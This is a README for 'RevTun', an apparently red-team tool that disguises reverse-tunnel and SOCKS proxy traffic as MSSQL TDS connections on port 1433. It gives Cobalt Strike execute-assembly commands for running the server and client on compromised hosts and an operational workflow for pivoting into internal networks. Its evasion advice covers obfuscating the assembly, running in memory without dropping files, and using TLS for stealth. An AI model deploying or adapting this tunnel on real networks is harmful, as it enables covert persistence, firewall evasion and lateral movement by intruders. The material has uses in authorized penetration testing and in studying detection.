# RevTun - MSSQL Reverse Tunnel

A reverse tunneling tool that disguises network traffic as MSSQL communications using the TDS protocol.

## How It Works

Server listens on port 1433 (MSSQL), opens proxy on port 1080 when client connects. Client connects using TDS protocol and proxies traffic to real destinations.

## Available Implementations

This project provides two server implementations:

### C# Server (Primary)
- Full-featured implementation with TLS encryption support
- Requires .NET 8.0 or later
- Cross-platform (Windows, Linux, macOS)

### Python Server
- Lightweight implementation using only Python standard library
- Compatible with Python 3.7+
- Ideal for environments where .NET is not available
- Located in `revtun_server.py`

## Prerequisites

### C# Version
- .NET 8.0 or later

### Python Version  
- Python 3.7 or later (no additional dependencies required)

## Building

### C# Server

#### Standard Builds
```bash
# compile for windows
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:PublishTrimmed=true

# compile for linux
dotnet publish -c Release -r linux-x64 --self-contained true -p:PublishSingleFile=true -p:PublishTrimmed=true
```

#### Cobalt Strike execute-assembly Build
For use with Cobalt Strike's `execute-assembly` command:

```bash
# Build for .NET Framework 4.8 (recommended for execute-assembly)
dotnet build -c Release -f net48 -p:Platform=AnyCPU

# Alternative: Use the provided build scripts
# PowerShell
.\build-cs.ps1

# Batch file
.\build-cs.bat
```

The compiled assembly will be located at: `.\bin\Release\net48\revtun.exe`

**Important Notes for Cobalt Strike:**
- The .NET Framework 4.8 build is recommended for better compatibility
- Test the assembly with `execute-assembly` in a lab environment first
- Consider using obfuscation tools like ConfuserEx for operational security
- The assembly is designed to work in-memory without dropping files

### Python Server
No building required - runs directly with Python:
```bash
python3 revtun_server.py --help
```

## Usage

### Start Server

#### C# Server
```bash
dotnet run server
dotnet run server --port 1435 --proxy-port 8080 --verbose
```

#### Python Server
```bash
python3 revtun_server.py
python3 revtun_server.py --port 1435 --proxy-port 8080 --verbose
```

### Start Client
```bash
dotnet run client
dotnet run client --host server.example.com --port 1435 --debug
```

### Use Proxy
```bash
# HTTP requests
curl --proxy localhost:1080 http://httpbin.org/ip

# HTTPS requests (TLS/SSL)
curl --proxy localhost:1080 https://httpbin.org/ip
```

## Cobalt Strike Usage

### execute-assembly Commands

After building for .NET Framework 4.8, use these commands in Cobalt Strike:

#### Start Server (on compromised host)
```
execute-assembly revtun.exe server --port 1433 --proxy-port 1080 --verbose
```

#### Start Client (to connect back to server)
```
execute-assembly revtun.exe client --host [server-ip] --port 1433 --debug
```

### Operational Considerations

**Network Traffic:**
- Traffic appears as legitimate MSSQL database connections (TDS protocol)
- Uses standard port 1433 which is commonly allowed through firewalls
- TLS encryption available for additional stealth (`--encrypt` flag)

**Deployment Strategy:**
- Deploy server component on internet-facing compromised host
- Use client component to establish reverse tunnels from internal networks
- Proxy port (default 1080) provides SOCKS proxy for further pivoting

**OPSEC Recommendations:**
- Use `--require-encryption` for encrypted tunnels in sensitive environments
- Monitor for unusual MSSQL connection patterns in target networks
- Consider obfuscating the assembly before deployment
- Test connectivity in lab environment before operational use

### Example Operational Workflow
```
# 1. On external compromised server
execute-assembly revtun.exe server --port 1433 --proxy-port 1080 --require-encryption --verbose

# 2. On internal compromised client  
execute-assembly revtun.exe client --host external-server-ip --port 1433 --encrypt --debug

# 3. Use the established SOCKS proxy for pivoting
# The proxy will be available on the server at port 1080
```

## Options

### Server
- `--port, -p <port>` - MSSQL server port (default: 1433)
- `--proxy-port <port>` - Proxy port (default: 1080)
- `--bind <address>` - Bind address (default: 0.0.0.0)
- `--verbose, -v` - Enable logging
- `--require-encryption` - Require TLS encryption for all connections
- `--no-encryption` - Disable TLS encryption support

### Client
- `--host, -h <hostname>` - Server hostname (default: localhost)
- `--port, -p <port>` - Server port (default: 1433)
- `--username, -u <user>` - SQL username (default: sa)
- `--verbose, -v` - Enable logging
- `--debug` - Enable debug output and interactive SQL session
- `--encrypt` - Request TLS encryption
- `--require-encryption` - Require TLS encryption (fail if not supported)

## Encryption Support

RevTun now supports encrypted MSSQL tunnels using TLS/SSL encryption:

### Server Encryption Options
- **Default**: Supports encryption if client requests it
- `--require-encryption`: Forces all connections to use TLS encryption
- `--no-encryption`: Disables encryption support entirely

### Client Encryption Options
- **Default**: No encryption requested (plaintext tunnel)
- `--encrypt`: Requests TLS encryption from server
- `--require-encryption`: Requires TLS encryption (connection fails if server doesn't support it)

### Examples with Encryption
```bash
# Server requiring encryption
dotnet run server --require-encryption --verbose

# Client requesting encryption (silent mode)
dotnet run client --encrypt --host server.example.com

# Client with debug output and encryption
dotnet run client --encrypt --debug --host server.example.com

# Client requiring encryption
dotnet run client --require-encryption --host server.example.com
```

The encryption uses industry-standard TLS and protects both the tunnel traffic and the encapsulated data.

## Testing

### Python Server Testing
A test script is provided to verify the Python server implementation:

```bash
# Start the Python server in one terminal
python3 revtun_server.py --verbose

# Run the test script in another terminal
python3 test_python_server.py
```

The test script verifies:
- TDS protocol handshake (Pre-Login and Login)
- Proxy listener activation
- Basic HTTP CONNECT proxy functionality

## Client Operation Modes

- **Silent Mode** (default): Client runs silently in background, only outputs errors
- **Debug Mode** (`--debug`): Shows connection details, tunnel activity, and interactive SQL session  
- **Verbose Mode** (`--verbose`): Technical logging for troubleshooting (implied by `--debug`)

## Security Notes

RevTun now supports TLS encryption for enhanced security:

- **Plaintext Mode**: Basic TDS protocol obfuscation (legacy compatibility)
- **Encrypted Mode**: Full TLS encryption of tunnel traffic and data
- **Mixed Mode**: Server can accept both encrypted and plaintext connections (default)

When encryption is enabled, all traffic including tunnel data is protected by TLS.
